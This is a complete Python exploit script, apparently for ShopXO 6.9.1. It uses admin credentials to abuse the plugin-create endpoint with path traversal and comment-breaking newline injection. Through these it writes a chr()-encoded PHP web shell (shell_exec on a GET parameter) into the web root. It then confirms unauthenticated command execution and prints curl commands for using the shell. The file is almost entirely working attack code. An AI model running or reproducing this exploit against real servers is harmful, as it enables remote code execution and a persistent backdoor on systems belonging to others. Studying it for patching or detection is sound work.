#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import argparse
import re
import sys
import urllib.error
import urllib.parse
import urllib.request
from http.cookiejar import CookieJar

MARKER = 90350131
TIMEOUT = 25
TARGET_DIR = "sxov692"
CMD_PARAM = "cmd"


def chr_encode(s):
    # Build a string as chr(a).chr(b)... to avoid quotes filtered by htmlspecialchars
    return ".".join("chr(%d)" % ord(c) for c in s)


def http(method, url, data=None, opener=None):
    body = urllib.parse.urlencode(data, doseq=True).encode() if data is not None else None
    req = urllib.request.Request(url, data=body, method=method)
    req.add_header("User-Agent", "shopxo-live-poc/2.0")
    if data is not None:
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
    req.add_header("X-Requested-With", "XMLHttpRequest")
    op = opener or urllib.request.build_opener()
    try:
        with op.open(req, timeout=TIMEOUT) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def login(base, entry, accounts, password):
    jar = CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
    status, text = http("POST", "%s/%s?s=/admin/login" % (base, entry),
                        {"type": "username", "accounts": accounts, "pwd": password}, opener)
    if '"code":0' not in text:
        print("[!] Login failed: %s" % text[:300])
        return None
    print("[+] Admin login OK (%s / %s)" % (accounts, password))
    return opener


def build_payloads(target_dir, cmd_param):
    # plugins: close the namespace line with ';#' then traverse out to the web root
    # name: break out of the inline comment with a newline, inject quote-free PHP
    plugins = "x;#/../../../public/" + target_dir
    code = ("echo %d;$k=%s;$c=isset($_GET[$k])?$_GET[$k]:chr(105).chr(100);"
 "echo @\\shell_exec($c.chr(32).chr(50).chr(62).chr(38).chr(49));"
            % (MARKER, chr_encode(cmd_param)))
    name = "x\n" + code + "\n//"
    return plugins, name


def fire(base, entry, opener, data):
    print("[*] Step 1 POST /%s?s=/pluginsadmin/save plugins=%r" % (entry, data["plugins"]))
    return http("POST", "%s/%s?s=/pluginsadmin/save" % (base, entry), data, opener)


def run_shell(base, target_dir, cmd, param):
    url = "%s/%s/admin/Admin.php?%s=%s" % (base, target_dir, param, urllib.parse.quote(cmd))
    status, text = http("GET", url, None, None)
    body = text.replace(str(MARKER), "", 1).strip()
    print("    GET %s -> HTTP %s" % (url, status))
    print("    output: %s" % (body.splitlines()[0] if body else "(empty)"))
    return (str(MARKER) in text), body


def main():
    ap = argparse.ArgumentParser(description="ShopXO 6.9.1 plugin-create path traversal + code injection -> RCE (shell mode)")
    ap.add_argument("-u", "--url", required=True, help="target base URL, e.g. http://192.168.6.211")
    ap.add_argument("--admin-entry", required=True, help="admin entry file name, e.g. admintqbya8.php")
    ap.add_argument("-a", "--accounts", required=True, help="admin account")
    ap.add_argument("-p", "--password", required=True, help="admin password")
    ap.add_argument("--mode", choices=["shell"], default="shell", help="only shell mode is kept")
    args = ap.parse_args()

    base = args.url.rstrip("/")
    host = urllib.parse.urlparse(base).hostname or ""
    if not re.match(r"^\d{1,3}(\.\d{1,3}){3}$|^[a-z0-9.\-]+$", host):
        print("[!] Invalid target address")
        return 1

    opener = login(base, args.admin_entry, args.accounts, args.password)
    if opener is None: return 1

    plugins, name = build_payloads(TARGET_DIR, CMD_PARAM)
    data = {
        "plugins": plugins, "name": name,
        "logo": "/static/upload/x.png", "author": "audit",
        "author_url": "http://example.com", "version": "1.0.0",
        "desc": "audit", "apply_terminal": "pc", "apply_version": "1.0.0",
    }
    status, text = fire(base, args.admin_entry, opener, data)
    print("    HTTP %s %s" % (status, text[:240]))
    if '"code":0' not in text:
        print("[!] Create-plugin API did not return success, abort")
        return 1

    shell_url = "%s/%s/admin/Admin.php" % (base, TARGET_DIR)
    print("[*] Step 2 shell URL (inside web root): %s" % shell_url)

    print("[*] Step 3 unauthenticated command check (no cookie, read-only cmd: id)")
    ok, _ = run_shell(base, TARGET_DIR, "id", CMD_PARAM)
    if ok:
        print("[+] Shell is live. Manual use:")
        print('curl "%s?%s=id"' % (shell_url, CMD_PARAM))
        print('curl "%s?%s=whoami;hostname;uname -a"' % (shell_url, CMD_PARAM))

    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
